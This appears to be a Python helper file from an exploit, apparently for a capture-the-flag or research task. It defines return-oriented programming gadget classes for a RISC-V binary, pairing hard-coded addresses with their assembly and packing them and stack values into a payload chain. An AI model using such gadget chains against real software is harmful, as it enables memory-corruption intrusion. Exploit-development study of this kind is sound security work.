import struct

class Gadget():
    def __init__(self, vaddr):
        self.__vaddr = vaddr

    def get_vaddr(self):
        return self.__vaddr

    def print_gadget(self):
        return struct.pack("q", self.__vaddr)

class Charger(Gadget):
    '''
    ld ra, 0x1a8(sp)
    ld s0, 0x1a0(sp)
    ld s1, 0x198(sp)
    ld s2, 0x190(sp)
    ld s3, 0x188(sp)
    ld s4, 0x180(sp)
    ld s5, 0x178(sp)
    ld s6, 0x170(sp)
    ld s7, 0x168(sp)
    ld s8, 0x160(sp)
    ld s9, 0x158(sp)
    ld s10, 0x150(sp)
    ld s11, 0x148(sp)
    addi sp, 0x1b0
    jr ra
    '''

    def __init__(self):
        super().__init__(0x12232)
        self.__stack_frame = None

    def set_stack_frame(self, stack_frame):
        self.__stack_frame = stack_frame

    def print_gadget(self):
        ans = super().print_gadget()

        if self.__stack_frame is None:
            print("[Error] no stack frame given for charger")
        else:
            for value in self.__stack_frame:
                ans += struct.pack("q", value)

        return ans

class InitializeA3(Gadget):
    '''
    mv	a3, s7
    addi a2, sp, 0x40
    jalr s4
    '''
    def __init__(self):
        super().__init__(0x260f6)

class MoveA3(Gadget):
    '''
    add	a3, a3, s1
    addi a2, sp, 0x48
    mv a0, s5
    jalr s4
    '''
    def __init__(self):
        super().__init__(0x2a1f4)